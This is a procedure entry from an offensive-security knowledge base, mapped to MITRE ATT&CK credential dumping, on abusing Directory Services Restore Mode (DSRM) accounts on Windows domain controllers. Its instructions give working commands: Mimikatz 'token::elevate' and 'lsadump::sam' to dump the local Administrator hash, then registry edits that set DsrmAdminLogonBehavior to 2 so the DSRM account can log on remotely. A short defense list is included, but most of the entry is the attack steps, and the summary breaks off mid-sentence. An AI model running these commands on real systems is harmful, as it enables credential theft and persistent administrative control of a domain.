---
id: 45a53e9c-7b59-436f-8749-7925c610fdeb
name: Dump Local Administrator Hash and Activate Password with DSRM Credentials
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.504398+00:00'
updated_at: '2023-04-10T20:26:25.924983+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Active Directory Attacks]]'
- '[[DSRM Credentials]]'
---

# Dump Local Administrator Hash and Activate Password with DSRM Credentials

## Summary

Dumping local administrator hashes and activating the password using DSRM credentials is a commonly used technique by attackers to gain access to target systems. By obtaining the DSRM credentials, an attacker can dump the local administrator hashes and activate the password, allowing them to access

## Description

# Description

Dumping local administrator hashes and activating the password using DSRM credentials is a commonly used technique by attackers to gain access to target systems. By obtaining the DSRM credentials, an attacker can dump the local administrator hashes and activate the password, allowing them to access the target system with full administrative privileges. This technique can be used to move laterally within the network and escalate privileges to gain access to sensitive information.

Technical Explanation: DSRM or Directory Services Restore Mode is a boot mode in Windows Server that is used to perform offline maintenance or restoration of Active Directory. The DSRM account is a local administrator account that is used to log in to a domain controller when it is in DSRM. The account is created during the promotion of the domain controller and is used to perform tasks that are related to Active Directory maintenance and restoration.

Business Value: By obtaining DSRM credentials and dumping local administrator hashes, attackers can gain full administrative access to target systems, allowing them to move laterally within the network and access sensitive information. This can result in data theft, intellectual property theft, and financial loss.

## Requirements

1. Access to DSRM credentials

1. Access to the target system

## Defense

1. Implement strong password policies and regularly change passwords for DSRM accounts

1. Monitor and log all DSRM account logins and changes

1. Implement multi-factor authentication for DSRM accounts

## Objectives

1. Dump local administrator hashes and activate the password using DSRM credentials

1. Gain full administrative access to the target system

1. Move laterally within the network

1. Escalate privileges to gain access to sensitive information

# Instructions

1. To use this command, run the following PowerShell script:

1. Run the command: Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' to dump the local Administrator hash.
2. Check if the key exists and get the value by running the command: Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior.
3. Create the key with value "2" if it doesn't exist by running the command: New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD.
4. Change the value to "2" by running the command: Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2.

**Code**: [[Invoke-Mimikatz -Command '"token::elevate" "lsadum]]

> This command is used to dump the local Administrator hash using Mimikatz and activate the password for remote access to the local Administrator user. The command consists of four steps:

1. Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"': This command is used to dump the local Administrator hash using Mimikatz.
2. Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior: This command is used to check if the key exists and get the value.
3. New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD: This command is used to create the key with value "2" if it doesn't exist.
4. Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2: This command is used to change the value to "2".

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Tags

- [[Active Directory Attacks]]
- [[DSRM Credentials]]
